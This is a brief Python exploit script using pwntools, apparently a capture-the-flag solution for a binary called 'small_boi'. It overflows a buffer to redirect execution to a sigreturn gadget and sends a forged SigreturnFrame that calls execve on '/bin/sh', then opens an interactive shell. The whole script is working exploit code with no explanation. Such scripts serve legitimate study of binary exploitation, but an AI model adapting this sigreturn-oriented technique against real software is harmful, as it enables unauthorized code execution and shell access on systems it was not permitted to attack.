from pwn import *


target = process("./small_boi")

payload = "1234567891122334455667788991112223334445" + "\x40\x01\x7c"[::-1] + "\x00"*5 

context.arch = "amd64"
frame = SigreturnFrame()

frame.rip = 0x400185 # Syscall instruction
frame.rax = 59       # execve syscall
frame.rdi = 0x4001ca # Address of "/bin/sh"
frame.rsi = 0x0      # NULL
frame.rdx = 0x0      # NULL
print(str(frame))
target.sendline(payload + str(frame)[8:])

target.interactive()
